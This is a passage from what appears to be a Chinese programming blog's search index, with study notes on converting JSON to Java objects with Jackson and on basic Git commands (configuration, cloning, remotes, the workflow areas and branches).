class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span> <br>                <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以使用快捷键Alt+Insert，添加插件，随后选择内容即可（内容可以自动弹出）</p><img src="/img/Maven学习/4.png">]]></content>
    
    
    
    <tags>
      
      <tag>Java Web</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSON数据和Java对象的相互转换</title>
    <link href="/2021/08/16/JSON%E6%95%B0%E6%8D%AE%E5%92%8CJava%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
    <url>/2021/08/16/JSON%E6%95%B0%E6%8D%AE%E5%92%8CJava%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<h3 id="Json介绍"><a href="#Json介绍" class="headerlink" title="Json介绍"></a>Json介绍</h3><p>Json有一下几种解释的方法</p><ul><li>JSON 指的是 JavaScript 对象表示法（<strong>J</strong>ava<strong>S</strong>cript <strong>O</strong>bject <strong>N</strong>otation）</li><li>JSON 是轻量级的文本数据交换格式</li><li>JSON 具有自我描述性，更易理解</li><li>JSON 独立于语言<ul><li>JSON 使用 Javascript语法来描述数据对象，但是 JSON 仍然独立于语言和平台</li><li>JSON 解析器和 JSON 库支持许多不同的编程语言</li><li> 目前非常多的动态（PHP，JSP，.NET）编程语言都支持JSON</li></ul></li></ul><h3 id="Json语法"><a href="#Json语法" class="headerlink" title="Json语法"></a>Json语法</h3><ul><li>数据在键值对中（Key/Value）<ul><li>Key用引号（单双都行）引起来，也可以不使用引号<ul><li>Value的取值类</li><li>数字（整数或浮点数）</li><li>字符串（在双引号中）</li><li> boolean（true 或 false）</li><li>数组（在中括号中）    </li><li>对象（在大括号中）</li><li>null</li></ul></li></ul></li><li>数据由逗号分隔：多个键值对由逗号分隔</li><li>中括号保存数组：[]</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;sites&quot;</span>: [<br>        &#123; <span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;百度&quot;</span> , <span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;www.baidu.com&quot;</span> &#125;, <br>        &#123; <span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;google&quot;</span> , <span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;www.google.com&quot;</span> &#125;, <br>        &#123; <span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;github&quot;</span> , <span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;www.github.com&quot;</span> &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>大括号保存对象：{}</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;John&quot;</span> , <span class="hljs-attr">&quot;lastName&quot;</span>:<span class="hljs-string">&quot;Doe&quot;</span> &#125;<br></code></pre></td></tr></table></figure><h3 id="JSON数据和Java对象的相互转换"><a href="#JSON数据和Java对象的相互转换" class="headerlink" title="JSON数据和Java对象的相互转换"></a>JSON数据和Java对象的相互转换</h3><h4 id="JSON解析器"><a href="#JSON解析器" class="headerlink" title="JSON解析器"></a>JSON解析器</h4><p>常见的Json解析器有：jsonlib，gson，fastjson，jackson，<strong>本文章将使用jackson进行json与java对象互相转换的操作</strong></p><h4 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h4><h5 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h5><img src="/img/JSON数据和Java对象的相互转换/3.png"><h5 id="domain下的Person类"><a href="#domain下的Person类" class="headerlink" title="domain下的Person类"></a>domain下的Person类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.json.domain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">private</span> String address;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.name = name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> age;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.age = age;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAddress</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> address;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAddress</span><span class="hljs-params">(String address)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.address = address;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>            <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>            <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>            <span class="hljs-string">&quot;, address=&#x27;&quot;</span> + address + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="test下的JsonTest类"><a href="#test下的JsonTest类" class="headerlink" title="test下的JsonTest类"></a>test下的JsonTest类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.json.test;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.json.domain.Person;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JsonTest</span> </span>&#123;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">// 创建person对象</span><br>        Person person = <span class="hljs-keyword">new</span> Person();<br>        person.setName(<span class="hljs-string">&quot;json&quot;</span>);<br>        person.setAge(<span class="hljs-number">22</span>);<br>        person.setAddress(<span class="hljs-string">&quot;杭州&quot;</span>);<br><br>        <span class="hljs-comment">// 创建jackson解析器对象</span><br>        ObjectMapper objectMapper = <span class="hljs-keyword">new</span> ObjectMapper();<br><br>        <span class="hljs-comment">// 调用方法转换person对象为string字符串</span><br>        String string = objectMapper.writeValueAsString(person);<br><br>        System.out.println(string);<br>    &#125;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">// json数据</span><br>        String json = <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;json\&quot;,\&quot;age\&quot;:\&quot;23\&quot;,\&quot;address\&quot;:\&quot;运城\&quot;&#125;&quot;</span>;<br><br>        <span class="hljs-comment">// 创建jackson解析器对象</span><br>        ObjectMapper objectMapper = <span class="hljs-keyword">new</span> ObjectMapper();<br><br>        <span class="hljs-comment">// 调用方法将json转换为person对象</span><br>        Person person = objectMapper.readValue(json, Person.class);<br><br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="程序运行截图"><a href="#程序运行截图" class="headerlink" title="程序运行截图"></a>程序运行截图</h4><p>test1方法运行截图</p><img src="/img/JSON数据和Java对象的相互转换/1.png"><p>test2方法运行截图</p><img src="/img/JSON数据和Java对象的相互转换/2.png"><h3 id="自定义解析"><a href="#自定义解析" class="headerlink" title="自定义解析"></a>自定义解析</h3><p>当我们在转换时可能有一些特殊的需求，例如某属性需要按照某种格式进行转换（例如生日），某种属性不需要进行转换（例如薪水在企业中是需要保密的），在这个时候，注解可以帮我们解决这个问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 将生日按照特定格式进行转化</span><br><span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd&quot;)</span><br><span class="hljs-keyword">private</span> Date birthday;<br><br><span class="hljs-comment">// 薪水不需要进行转换</span><br><span class="hljs-meta">@JsonIgnore</span><br><span class="hljs-keyword">private</span> Double salary;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java Web</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git学习笔记</title>
    <link href="/2021/08/15/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/08/15/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="Git的用途"><a href="#Git的用途" class="headerlink" title="Git的用途"></a>Git的用途</h3><p>版本控制</p><h3 id="常见的版本控制工具"><a href="#常见的版本控制工具" class="headerlink" title="常见的版本控制工具"></a>常见的版本控制工具</h3><ul><li>Git</li><li>SVN（Subversion）</li><li>CVS（Concurrent Versions System）</li><li>VSS（Micorosoft Visual SourceSafe）</li><li>TFS（Team Foundation Server）</li><li>Visual Studio Online</li></ul><p>影响力最大且使用最广泛的是Git与SVN</p><h3 id="Git的起源"><a href="#Git的起源" class="headerlink" title="Git的起源"></a>Git的起源</h3><p>在没使用版本管理工具以前，Linux开源社区团队绝大多数的 Linux 内核维护工作<strong>都花在了提交补丁和保存归档的繁琐事务上</strong>。到 2002 年，Linux开源社区团队开始启用一个专有的分布式版本控制系统 BitKeeper 来管理和维护代码（BitKeeper 是收费的，但是鉴于Linux开源社区团队是一个非盈利组织，因此BitKeeper 公司将BitKeeper 免费提供给Linux开源社区团队使用）。</p><p>但是后来，Linux开源社区团队中有成员开始破解研究 BitKeeper，这使得BitKeeper公司非常不满，收回了Linux开源社区团队对于BitKeeper的免费使用权，Linux内核创始人Linus Torvalds后来出面让 BitKeeper跟Linux开源社区团队和解，使得Linux开源社区团队重新使用上了BitKeeper这个工具，<strong>但是2周后，Linus Torvalds就开发出自己的版本系统—Git</strong>。</p><h3 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h3><p><a href="https://git-scm.com/downloads%EF%BC%8C">https://git-scm.com/downloads，</a> 无脑下一步安装即可（安装路径可自行设置）</p><h3 id="Git的配置"><a href="#Git的配置" class="headerlink" title="Git的配置"></a>Git的配置</h3><ol><li><p>全局配置文件：GIT_HOME\etc\gitconfig</p></li><li><p>用户的个人配置文件：C:\Users\USERNAME\.gitconfig</p></li><li><p>进行配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; git config --global user.name <span class="hljs-string">&quot;你的名字&quot;</span> <span class="hljs-comment"># 该名字会在提交代码时进行使用</span><br><br>&gt; git config --global user.email <span class="hljs-string">&quot;你的邮箱&quot;</span> <span class="hljs-comment"># 该邮箱会在提交代码时进行使用</span><br></code></pre></td></tr></table></figure></li><li><p>查看配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ git config -l<br>diff.astextplain.textconv=astextplain<br>filter.lfs.clean=git-lfs clean -- %f<br>filter.lfs.smudge=git-lfs smudge -- %f<br>filter.lfs.process=git-lfs filter-process<br>filter.lfs.required=<span class="hljs-literal">true</span><br>http.sslbackend=openssl<br>http.sslcainfo=D:/Git/mingw64/ssl/certs/ca-bundle.crt<br>core.autocrlf=<span class="hljs-literal">true</span><br>core.fscache=<span class="hljs-literal">true</span><br>core.symlinks=<span class="hljs-literal">false</span><br>pull.rebase=<span class="hljs-literal">false</span><br>credential.helper=manager-core<br>credential.https://dev.azure.com.usehttppath=<span class="hljs-literal">true</span><br>init.defaultbranch=master<br>user.email=shileiz@foxmail.com<br>user.name=M0untainShley<br>http.sslverify=<span class="hljs-literal">true</span><br>core.repositoryformatversion=0<br>core.filemode=<span class="hljs-literal">false</span><br>core.bare=<span class="hljs-literal">false</span><br>core.logallrefupdates=<span class="hljs-literal">true</span><br>core.symlinks=<span class="hljs-literal">false</span><br>core.ignorecase=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="Git常用的一些操作"><a href="#Git常用的一些操作" class="headerlink" title="Git常用的一些操作"></a>Git常用的一些操作</h3><h4 id="将某个项目使用Git进行管理（git-init-git-clone）"><a href="#将某个项目使用Git进行管理（git-init-git-clone）" class="headerlink" title="将某个项目使用Git进行管理（git init/git clone）"></a>将某个项目使用Git进行管理（git init/git clone）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建文件夹</span><br>❯ mkdir GitProj<br><br><span class="hljs-comment"># 进入文件</span><br>❯ <span class="hljs-built_in">cd</span> GitProj<br><br><span class="hljs-comment"># 使用Git进行管理</span><br>❯ git init<br>Initialized empty Git repository <span class="hljs-keyword">in</span> C:/Users/ShleyCpt/Desktop/GitProj/.git/<br></code></pre></td></tr></table></figure><p>或者可以使用下面这种方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 克隆某个git文件</span><br>❯ git <span class="hljs-built_in">clone</span> https://github.com/M0untainShley/m0untainshley.github.io.git<br>Cloning into <span class="hljs-string">&#x27;m0untainshley.github.io&#x27;</span>...<br>remote: Enumerating objects: 18, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (18/18), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (11/11), <span class="hljs-keyword">done</span>.<br>remote: Total 18 (delta 0), reused 18 (delta 0), pack-reused 0<br>Receiving objects: 100% (18/18), 37.46 KiB | 87.00 KiB/s, <span class="hljs-keyword">done</span>.<br></code></pre></td></tr></table></figure><h4 id="Git查看远程仓库（git-remote）"><a href="#Git查看远程仓库（git-remote）" class="headerlink" title="Git查看远程仓库（git remote）"></a>Git查看远程仓库（git remote）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看远程仓库的信息</span><br>❯ git remote -v<br><br><span class="hljs-comment"># 添加远程仓库</span><br>❯ git remote add RemoteRepo https://github.com/M0untainShley/m0untainshley.github.io  <span class="hljs-comment"># RemoteRepo可以理解为一个别名</span><br><br><span class="hljs-comment"># 查看远程仓库的信息</span><br>❯ git remote -v<br>RemoteRepo      https://github.com/M0untainShley/m0untainshley.github.io (fetch)<br>RemoteRepo      https://github.com/M0untainShley/m0untainshley.github.io (push)<br><br><span class="hljs-comment"># 查看远程仓库的详细信息</span><br>❯ git remote show RemoteRepo<br>* remote RemoteRepo<br>  Fetch URL: https://github.com/M0untainShley/m0untainshley.github.io<br>  Push  URL: https://github.com/M0untainShley/m0untainshley.github.io<br>  HEAD branch: master<br>  Remote branch:<br>    master new (next fetch will store <span class="hljs-keyword">in</span> remotes/RemoteRepo)<br>    <br><span class="hljs-comment"># 删除远程仓库</span><br>❯ git remote remove RemoteRepo<br><br><span class="hljs-comment"># 再次查看，已经没有任何信息了</span><br>❯ git remote -v<br><br></code></pre></td></tr></table></figure><h4 id="Git工作流程"><a href="#Git工作流程" class="headerlink" title="Git工作流程"></a>Git工作流程</h4><p>四个区域</p><ol><li>Workspace：工作区，就是你平时存放项目代码的地方</li><li>Index / Stage：暂存区，用于临时存放你的改动，事实上它只是一个文件，保存即将提交到文件列表信息</li><li>Repository：仓库区（或本地仓库），就是安全存放数据的位置，这里面有你提交到所有版本的数据。其中HEAD指向最新放入仓库的版本</li><li>Remote：远程仓库，托管代码的服务器，可以简单的认为是你项目组中的一台电脑用于远程数据交换</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加到暂存区</span><br>❯ git add .<br><br><span class="hljs-comment"># 添加到本地仓库</span><br>❯ git commit -m <span class="hljs-string">&quot;第一个Git文件&quot;</span><br><br><span class="hljs-comment"># 提交到远程仓库,本地的 master 分支推送到 origin 主机的 master 分支</span><br><span class="hljs-comment"># git push &lt;远程主机名&gt; &lt;本地分支名&gt;</span><br>&gt; git push origin master<br><br><span class="hljs-comment"># git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br>&gt; git push origin master:master<br></code></pre></td></tr></table></figure><p>四种状态</p><ol><li><p>Untracked: 未跟踪, 此文件在文件夹中, 但并没有加入到git库, 不参与版本控制. 通过git add 状态变为Staged.</p></li><li><p>Unmodify: 文件已经入库, 未修改, 即版本库中的文件快照内容与文件夹中完全一致. 这种类型的文件有两种去处, 如果它被修改, 而变为Modified. 如果使用git rm移出版本库, 则成为Untracked文件</p></li><li><p>Modified: 文件已修改, 仅仅是修改, 并没有进行其他的操作. 这个文件也有两个去处, 通过git add可进入暂存staged状态, 使用git checkout 则丢弃修改过, 返回到unmodify状态, 这个git checkout即从库中取出文件, 覆盖当前修改 !</p></li><li><p>Staged: 暂存状态. 执行git commit则将修改同步到库中, 这时库中的文件和本地文件又变为一致, 文件为Unmodify状态. 执行git reset HEAD filename取消暂存, 文件状态为Modified</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看文件的状态</span><br>&gt; git status FILENAME<br></code></pre></td></tr></table></figure><h3 id="Git分支"><a href="#Git分支" class="headerlink" title="Git分支"></a>Git分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出本地的分支，*代表当前的分支</span><br>❯ git branch<br>* master<br><br><span class="hljs-comment"># 创建分支</span><br>❯ git branch MyBranch<br>❯ git branch <span class="hljs-comment"># 查看本地分支，出现了一个MyBranch分支</span><br>  MyBranch<br>* master<br><br><span class="hljs-comment"># 切换分支</span><br>❯ git checkout MyBranch<br>Switched to branch <span class="hljs-string">&#x27;MyBranch&#x27;</span><br>❯ git branch <span class="hljs-comment"># 已经切换到MyBranch分支</span><br>* MyBranch<br>  master<br>  <br><span class="hljs-comment"># 删除分支（需要先切换为其它分支）</span><br>❯ git checkout master<br>Switched to branch <span class="hljs-string">&#x27;master&#x27;</span><br>❯ git branch -d MyBranch <span class="hljs-comment"># 删除MyBranch分支</span><br>Deleted branch MyBranch (was 7ab68b2).<br>❯ git branch <span class="hljs-comment"># 已删除</span><br>* master<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java Web</tag>
      
      <tag>学习笔记</tag>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
